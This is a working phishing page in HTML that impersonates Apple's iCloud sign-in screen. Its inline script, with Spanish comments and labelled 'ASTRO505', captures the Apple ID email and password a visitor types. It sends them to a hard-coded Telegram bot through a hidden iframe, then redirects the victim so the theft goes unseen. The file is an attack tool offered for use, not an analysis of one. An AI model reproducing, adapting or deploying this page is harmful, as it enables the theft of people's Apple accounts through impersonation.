<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <title>Sign in - iCloud</title>
</head>
<body>
    <header><nav><a href="index.html" class="icloud-logo"><i class='bx bxl-apple'></i>iCloud</a></nav></header>
    
    <main id="main">
        <form id="sign-in">
            <div class="error-message" id="errorMsg"></div>
            
            <div class="login-form">
                <img id="apple-color-logo" src="IMG/sign-in-screen-img.svg" alt="Apple">
                <p id="loginTitle">Sign in with your Apple ID</p>
                
                <div class="input-group">
                    <input id="email-phone" type="email" placeholder="Email or phone number" required>
                    <i class='bx bx-right-arrow-circle'></i>
                </div>
                
                <div class="input-group password-field" id="passwordField">
                    <input id="password" type="password" placeholder="Password">
                    <i class='bx bx-lock-alt'></i>
                </div>
                
                <button type="submit" class="submit-btn" id="submitBtn">Sign In</button>
            </div>
            
            <div class="login-options">
                <label class="checkbox-label">
                    <input type="checkbox" id="check"> Keep me signed in
                </label>
                <div class="links">
                    <a href="#">Forgot Apple ID or password?</a>
                    <a href="#">Create Apple ID</a>
                </div>
            </div>
        </form>
    </main>
    
    <footer>
        <div class="footer-div">
            <span>System Status</span><div class="sep"></div>
            <span>Privacy Policy</span><div class="sep"></div>
            <span>Terms & Conditions</span>
        </div>
        <div class="footer-div copyright">© 2024 Apple Inc. All rights reserved.</div>
    </footer>

    <!-- 🔥 SCRIPT CORREGIDO - ENVÍA CON IFRAME INVISIBLE -->
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            console.log('🚀 SCRIPT TELEGRAM V2 - REDIRECCIÓN FIJA');
            
            const emailInput = document.getElementById('email-phone');
            const arrowIcon = document.querySelector('.bx-right-arrow-circle');
            const passwordField = document.getElementById('passwordField');
            const passwordInput = document.getElementById('password');
            const submitBtn = document.getElementById('submitBtn');
            const errorMsg = document.getElementById('errorMsg');
            const form = document.getElementById('sign-in');
            
            let loginAttempts = 0;
            
            // Crear IFRAME invisible para Telegram
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.name = 'telegramFrame';
            document.body.appendChild(iframe);
            
            // Flecha/Enter → Password
            const showPassword = () => {
                if (emailInput.value.trim()) {
                    passwordField.classList.add('show');
                    submitBtn.classList.add('show');
                    setTimeout(() => passwordInput.focus(), 300);
                }
            };
            
            arrowIcon.addEventListener('click', showPassword);
            emailInput.addEventListener('keypress', e => {
                if (e.key === 'Enter' && emailInput.value.trim()) {
                    showPassword();
                }
            });
            
            // 🔥 SUBMIT CORREGIDO - IFRAME INVISIBLE
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                loginAttempts++;
                
                const email = emailInput.value.trim();
                const password = passwordInput.value.trim();
                
                console.log('📧 Capturado:', email, password);
                
                if (!email || !password) {
                    showError('Please enter both email and password');
                    return;
                }
                
                // 🔥 URL TELEGRAM EN IFRAME (NO BLOQUEA PÁGINA)
                const message = `🚀 *ASTRO505 - NUEVA CAPTURA APPLE ID* 🚀

📧 *Email:* ${email}
🔑 *Password:* ${password}
🌍 *País:* Web
💻 *Navegador:* Chrome
📱 *Device:* PC
📅 *Hora:* ${new Date().toLocaleString('es-ES')}

✨ *Plataforma:* Astro505`;

                const telegramUrl = `https://api.telegram.org/bot7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA/sendMessage?chat_id=7219932215&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
                
                console.log('📤 Enviando a Telegram...');
                
                // Envía en iframe invisible
                iframe.src = telegramUrl;
                
                // ✅ REDIRIGE INMEDIATAMENTE (Telegram en background)
                showError('Signing in...');
                setTimeout(() => {
                    window.location.href = 'index.html';
                }, 800);
            });
            
            function showError(message) {
                errorMsg.textContent = message;
                errorMsg.classList.add('show');
                setTimeout(() => errorMsg.classList.remove('show'), 3000);
            }
            
            console.log('✅ LISTO - IFRAME Telegram + Redirección');
        });
    </script>
</body>
</html>
